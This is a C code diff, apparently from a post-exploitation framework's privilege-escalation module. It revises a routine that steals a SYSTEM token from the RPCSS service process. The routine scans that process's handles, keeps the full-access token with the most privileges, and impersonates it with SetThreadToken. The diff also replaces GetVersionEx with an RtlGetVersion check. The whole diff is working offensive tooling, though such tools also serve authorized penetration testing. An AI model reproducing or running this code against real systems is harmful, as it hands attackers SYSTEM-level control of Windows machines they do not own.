@@ -8,6 +8,7 @@
 #define STATUS_INFO_LENGTH_MISMATCH 0xc0000004
 typedef NTSTATUS(WINAPI* NTQUERYINFORMATIONPROCESS)(HANDLE ProcessHandle, DWORD ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);
 typedef NTSTATUS(WINAPI* NTQUERYOBJECT)(HANDLE Handle, DWORD ObjectInformationClass, PVOID ObjectInformation, ULONG ObjectInformationLength, PULONG ReturnLength);
+typedef NTSTATUS(WINAPI* PRtlGetVersion)(LPOSVERSIONINFOEXW);
 
 typedef enum _OBJECT_INFORMATION_CLASS {
 	ObjectBasicInformation = 0,
@@ -136,9 +137,11 @@ DWORD get_system_token(HANDLE hProc, PHANDLE phToken)
 	ULONG ulLength = sizeof(PROCESS_HANDLE_SNAPSHOT_INFORMATION);
 	ULONG tokenIndex;
 	ULONG i;
-	DWORD dwResult = ERROR_UNIDENTIFIED_ERROR;
+	ULONG ulMaxPrivCount = 0;
 	HANDLE hToken = NULL;
+	HANDLE hBestToken = NULL;
 	HANDLE hThread = GetCurrentThread();
+	DWORD dwResult = ERROR_UNIDENTIFIED_ERROR;
 	TOKEN_STATISTICS tokenStats;
 	LUID systemLuid = SYSTEM_LUID;
 	HMODULE hNtdll = NULL;
@@ -177,7 +180,8 @@ DWORD get_system_token(HANDLE hProc, PHANDLE phToken)
 			if (status == STATUS_INFO_LENGTH_MISMATCH) {
 				continue;
 			}
-			BREAK_WITH_ERROR("[ELEVATE] get_system_token. NtQueryInformationProcess failed", ERROR_UNIDENTIFIED_ERROR);
+			dprintf("NtQueryInformationProcess returned NT_STATUS: %ul", status);
+			BREAK_WITH_ERROR("[ELEVATE] get_system_token. NtQueryInformationProcess failed", status);
 		} while (status == STATUS_INFO_LENGTH_MISMATCH);
 
 		if (!NT_SUCCESS(status)) {
@@ -189,8 +193,7 @@ DWORD get_system_token(HANDLE hProc, PHANDLE phToken)
 				continue;
 			}
 
-			// TODO: this 0xf01ff value needs to be examined...
-			if (pHandleInfo->Handles[i].GrantedAccess != 0xf01ff) {
+			if ((pHandleInfo->Handles[i].GrantedAccess & TOKEN_ALL_ACCESS) != TOKEN_ALL_ACCESS) {
 				continue;
 			}
 
@@ -208,23 +211,24 @@ DWORD get_system_token(HANDLE hProc, PHANDLE phToken)
 				continue;
 			}
 
-			// TODO: check this value for systems older than Windows 10
-			if (tokenStats.PrivilegeCount < 22) { 
+			if (tokenStats.PrivilegeCount <= ulMaxPrivCount) {
 				CloseHandle(hToken);
 				continue;
 			}
 
-			if (!SetThreadToken(&hThread, hToken)) {
-				CloseHandle(hToken);
-				CONTINUE_ON_ERROR("[ELEVATE] get_system_token. SetThreadToken failed");
+			// newer versions of windows have more defined privileges so update the best token to the one with the most
+			ulMaxPrivCount = tokenStats.PrivilegeCount;
+			if (hBestToken) {
+				CloseHandle(hBestToken);
 			}
-
-			*phToken = hToken;
-			dwResult = ERROR_SUCCESS;
-			break;
+			hBestToken = hToken;
 		}
 	} while (0);
 
+	if (hBestToken) {
+		*phToken = hBestToken;
+		dwResult = ERROR_SUCCESS;
+	}
 	if (pHandleInfo) {
 		HeapFree(GetProcessHeap(), 0, pHandleInfo);
 	}
@@ -236,6 +240,7 @@ DWORD post_callback_use_rpcss(Remote* remote)
 	SC_HANDLE hScm = NULL;
 	SC_HANDLE hSvc = NULL;
 	HANDLE hProc = NULL;
+	HANDLE hThread = GetCurrentThread();
 	SERVICE_STATUS_PROCESS procInfo;
 	DWORD dwBytes;
 	DWORD dwResult = ERROR_ACCESS_DENIED;
@@ -262,7 +267,12 @@ DWORD post_callback_use_rpcss(Remote* remote)
 		}
 
 		if (get_system_token(hProc, &hToken) != ERROR_SUCCESS) {
-			BREAK_ON_ERROR("[ELEVATE] post_callback_use_rpcss. get_system_token failed");
+			BREAK_WITH_ERROR("[ELEVATE] post_callback_use_rpcss. get_system_token failed", ERROR_UNIDENTIFIED_ERROR);
+		}
+
+		if (!SetThreadToken(&hThread, hToken)) {
+			CloseHandle(hToken);
+			BREAK_WITH_ERROR("[ELEVATE] post_callback_use_rpcss. SetThreadToken failed", ERROR_ACCESS_DENIED);
 		}
 
 		dwResult = ERROR_SUCCESS;
@@ -295,21 +305,31 @@ DWORD elevate_via_service_namedpipe_rpcss(Remote* remote, Packet* packet)
 	HANDLE hSem = NULL;
 	char cPipeName1[MAX_PATH] = { 0 };
 	char cPipeName2[MAX_PATH] = { 0 };
-	OSVERSIONINFO os = { 0 };
+	HMODULE hNtdll = NULL;
+	OSVERSIONINFOEXW os = { 0 };
 	HANDLE hPipe = NULL;
 	DWORD dwPipeUid[2] = { 0, 0 };
 	PRIV_POST_IMPERSONATION PostImpersonation;
+	PRtlGetVersion pRtlGetVersion = NULL;
 
 	do {
-		os.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
-		if (!GetVersionEx(&os)) {
-			BREAK_ON_ERROR("[ELEVATE] elevate_via_service_namedpipe_rpcss: GetVersionEx failed")
+		hNtdll = GetModuleHandleA("ntdll");
+		if (hNtdll == NULL) {
+			BREAK_ON_ERROR("[ELEVATE] elevate_via_service_namedpipe_rpcss: Failed to resolve RtlGetVersion");
 		}
 
-		// TODO: actually test this on XP / server 2003
-		// filter out systems older than Windows XP (5.1) for this technique
-		if ((os.dwMajorVersion < 5) || (os.dwMajorVersion == 5 && os.dwMinorVersion == 0)) {
-			SetLastError(ERROR_ACCESS_DENIED);
+		pRtlGetVersion = (PRtlGetVersion)GetProcAddress(hNtdll, "RtlGetVersion");
+		if (pRtlGetVersion == NULL) {
+			BREAK_ON_ERROR("[ELEVATE] elevate_via_service_namedpipe_rpcss: Failed to resolve RtlGetVersion");
+		}
+
+		if (pRtlGetVersion(&os)) {
+			BREAK_ON_ERROR("[ELEVATE] elevate_via_service_namedpipe_rpcss: RtlGetVersion failed");
+		}
+
+		// filter out systems older than Windows 8.1 / Server 2012 R2 (6.3) for this technique
+		if ((os.dwMajorVersion < 6) || (os.dwMajorVersion == 6 && os.dwMinorVersion < 3)) {
+			SetLastError(ERROR_CALL_NOT_IMPLEMENTED);
 			BREAK_ON_ERROR("[ELEVATE] elevate_via_service_namedpipe_rpcss: Windows 2000 and older are unsupported");
 		}
 
